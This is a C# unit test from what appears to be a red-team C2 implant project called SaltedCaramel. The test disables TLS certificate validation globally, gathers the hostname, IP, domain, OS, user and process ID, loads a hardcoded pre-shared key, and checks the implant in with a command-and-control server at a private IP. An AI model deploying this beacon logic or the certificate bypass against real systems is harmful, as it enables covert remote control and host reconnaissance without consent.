using Microsoft.VisualStudio.TestTools.UnitTesting;
using System;
using System.Diagnostics;
using System.Linq;
using System.Net;
using System.Net.Sockets;

namespace SaltedCaramel.Tests
{
    [TestClass()]
    public class ImplantTests
    {
        [TestMethod()]
        public void InitializeImplantValid()
        {
            // Necessary to disable certificate validation
            ServicePointManager.ServerCertificateValidationCallback = 
                delegate { return true; };

            SCImplant implant = new SCImplant();
            implant.uuid = "3915d66f-e9a5-4912-8442-910e0cee74df"; // Generated when payload is created in Apfell
            implant.endpoint = "https://192.168.38.192/api/v1.3/";
            implant.host = Dns.GetHostName();
            implant.ip = Dns.GetHostEntry(implant.host) // Necessary because the host may have more than one interface
                .AddressList.FirstOrDefault(ip => ip.AddressFamily == AddressFamily.InterNetwork).ToString();
            implant.domain = Environment.UserDomainName;
            implant.os = Environment.OSVersion.VersionString;
            implant.architecture = "x64";
            implant.pid = Process.GetCurrentProcess().Id;
            implant.sleep = 5000;
            implant.user = Environment.UserName;
            HTTP.crypto.PSK = Convert.FromBase64String("CqxQlHyWOSWJprgBA6aiKPP94lCSn8+Ki+gpMVdLNgQ=");
            Assert.IsTrue(implant.InitializeImplant());
        }
    }
}
